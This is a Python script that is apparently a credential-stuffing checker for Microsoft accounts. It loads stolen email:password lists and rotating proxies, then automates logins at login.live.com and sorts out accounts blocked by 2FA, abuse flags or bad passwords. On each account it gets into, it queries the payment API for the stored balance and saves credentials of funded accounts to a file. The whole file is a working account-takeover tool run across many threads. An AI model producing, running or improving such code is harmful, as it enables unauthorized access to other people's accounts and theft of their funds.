from concurrent.futures import ThreadPoolExecutor
from requests_toolbelt import MultipartEncoder
from modules.ui import Logger
from modules.utils import *
from pystyle import Colors
from uuid import uuid4
import urllib.parse
import random
import string
import logging

import requests

retries = 10

proxies = open("proxies.txt", "r").read().splitlines()
accounts = open("accounts.txt", "r").read().splitlines()

class GetPms:

    def __init__(self, account: str) -> None:

        self.account = account
        
        email_data = sort_email(account)

        if not email_data:

            Logger.Log("SPLITTING", "Failed to split email data", Colors.red, email = account)

            return
        
        self.email, self.password = email_data

        self.session = requests.Session()
        self.session.proxies = get_formatted_proxy(random.choice(proxies)) if proxies else None

        self.coBrandId = str(uuid4())

        self.name = setup_name()

        self.proof_bypassed = False

    def _exec_request(self, **kwargs):

        for _ in range(retries):

            try:

                response = self.session.request(**kwargs)

                return response
            
            except Exception as e:

                Logger.Log("REQUEST", f"Failed to execute request", Colors.red, exception = str(e))

                continue

        return None
    
    
    def _login(self):

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'document',
            'Accept-Encoding': 'identity',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Sec-GPC': '1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }


        response = self._exec_request(method="GET", url='https://login.live.com/ppsecure/post.srf', headers=headers)

        try:
            ppft = response.text.split('type="hidden" name="PPFT" id="i0327" value="')[1].split('"')[0]
            urlpost = response.text.split(",urlPost:'")[1].split("'")[0]

        except Exception as e:
            Logger.Log("LOGIN", "Failed to get PPFT and urlPost", Colors.red, email = self.email)
            return

        data = f'i13=0&login={self.email}&loginfmt={self.email}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={self.password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i19=449894'

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://login.live.com',
            'Referer': 'https://login.live.com/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Sec-GPC': '1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }  

        response = self._exec_request(method="POST", url=urlpost, headers=headers, data=data)

        if response.status_code != 200:

            Logger.Log("LOGIN", "Failed to login", Colors.red, error = "Proxy Flagged", email = self.email)

            return 'retry'
        
            
        elif "https://account.live.com/recover" in response.text:

            Logger.Log("LOGIN", "Failed to login", Colors.red, error = "2 Factor Authentication", email = self.email)

            return
        
        elif "https://account.live.com/Abuse" in response.text:
                
            Logger.Log("LOGIN", "Failed to login", Colors.red, error = "Abuse", email = self.email)

            return
        
            
        elif "https://account.live.com/identity/confirm?mkt=EN-US&uiflavor=web" in response.text:
            Logger.Log("LOGIN", "Failed to login", Colors.red, error = "Proofs Required", email = self.email)

            return

        elif "sFT:'" not in response.text:
                
            Logger.Log("LOGIN", "Failed to login", Colors.red, error = "Invalid Credentials", email = self.email)

            return

        try:
            sft = response.text.split(",sFT:'")[1].split("'")[0]
            url_post = response.text.split(",urlPost:'")[1].split("'")[0]
        except:
            Logger.Log("LOGIN", "Failed to get sFT and urlPost", Colors.red, email = self.email)
            return


        log_data2 = {
            "LoginOptions": "3",
            "type": "28",
            "ctx": "",
            "hpgrequestid": "",
            "PPFT": sft,
            "i19": "19130"
        }

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://login.live.com',
            'Referer': urlpost,
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Sec-GPC': '1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }

        response = self._exec_request(method="POST", url=url_post, headers=headers, data=log_data2)

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.8',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Origin': 'https://login.live.com',
            'Referer': 'https://login.live.com/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'cross-site',
            'Sec-GPC': '1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }

        data = {
            'pprid': response.text.split('<input type="hidden" name="pprid" id="pprid" value="')[1].split('"')[0],
            'NAP': response.text.split('<input type="hidden" name="NAP" id="NAP" value="')[1].split('"')[0],
            'ANON': response.text.split('<input type="hidden" name="ANON" id="ANON" value="')[1].split('"')[0],
            't': response.text.split('<input type="hidden" name="t" id="t" value="')[1].split('"')[0],
        }

        url = response.text.split('name="fmHF" id="fmHF" action="')[1].split('"')[0]

        response = self._exec_request(method="POST", url=url, headers=headers, data=data)


        return True
        
    def _get_payment_methods(self):
            
        url = "https://account.microsoft.com/billing/payments?fref=home.drawers.payment-options.investigate-charge"

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Host': 'account.microsoft.com',
            'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }

        response = self.session.get(url, headers=headers)

        try:
            token = response.text.split('<input name="__RequestVerificationToken" type="hidden" value="')[1].split('"')[0]
            Logger.Log("TOKEN", "Successfully got __RequestVerificationToken", Colors.blue, email = self.email)
        
        except:
                    
            Logger.Log("TOKEN", "Failed to get token", Colors.red, email = self.email)

            return
        
        url = "https://account.microsoft.com/auth/acquire-onbehalf-of-token"

        querystring = { "scopes": "pidl" }

        headers = {
            "host": "account.microsoft.com",
            "connection": "keep-alive",
            "sec-ch-ua-platform": "\"Windows\"",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "accept": "application/json, text/plain, */*",
            "sec-ch-ua": "\"Google Chrome\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"",
            "sec-ch-ua-mobile": "?0",
            "__requestverificationtoken": token,
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://account.microsoft.com/billing/payments?fref=home.drawers.payment-options.investigate-charge&refd=account.microsoft.com",
            "accept-language": "en-US,en;q=0.9",
        }

        response = self.session.get(url, headers=headers, params=querystring)

        try:
            token = response.json()[0]["token"]

        except:
                    
            Logger.Log("TOKEN", "Failed to get token", Colors.red, email = self.email)

            return
        
        url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx"

        querystring = { "status": "active,removed", "language": "en-US", "partner": "northstarweb" }
        headers = {
            "host": "paymentinstruments.mp.microsoft.com",
            "connection": "keep-alive",
            "sec-ch-ua-platform": "\"Windows\"",
            "authorization": "MSADELEGATE1.0=" + token,
            "sec-ch-ua": "\"Google Chrome\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"",
            "sec-ch-ua-mobile": "?0",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "accept": "application/json",
            "content-type": "application/json",
            "x-ms-test": "undefined",
            "origin": "https://account.microsoft.com",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://account.microsoft.com/",
            "accept-language": "en-US,en;q=0.9"
        }

        try:

            response = self.session.get(url, headers=headers, params=querystring).json()
            
            microsoftAccountBalance = response[0]["details"]["balance"]
            microsoftAccountCurrency = response[0]["details"]["currency"]
            Logger.Log("BALANCE", "Successfully got balance", Colors.green, email = self.email, balance = microsoftAccountBalance, currency = microsoftAccountCurrency)
            if microsoftAccountBalance == 0:
                with open("nobal.txt", "a") as f:
                    f.write(f"{self.email} | (Region) = {microsoftAccountCurrency}\n")

            else:
                with open("bal.txt", "a") as f:
                    f.write(f"{self.email}:{self.password} | (Balance) = {microsoftAccountBalance} | (Currency) = {microsoftAccountCurrency}\n")
            

            
        except:
            
            Logger.Log("GENERAL", "Failed to get payment methods", Colors.red, email = self.email)

            return False
        
    def _start(self):



        try:


            verification_token = self._login()

            if verification_token == 'retry':

                return

            elif not verification_token:

                return
            
            payment_methods = self._get_payment_methods()

            if not payment_methods:

                return

            return payment_methods
        
        except Exception as e:
            Logger.Log("GENERAL", "Failed to get payment methods", Colors.red, email = self.email, exception = str(e))

            return
        


if __name__ == "__main__":

    the = int(Logger.w_Input("Threads: "))

    with ThreadPoolExecutor(max_workers=the) as executor:

        for account in accounts:

            executor.submit(GetPms(account)._start)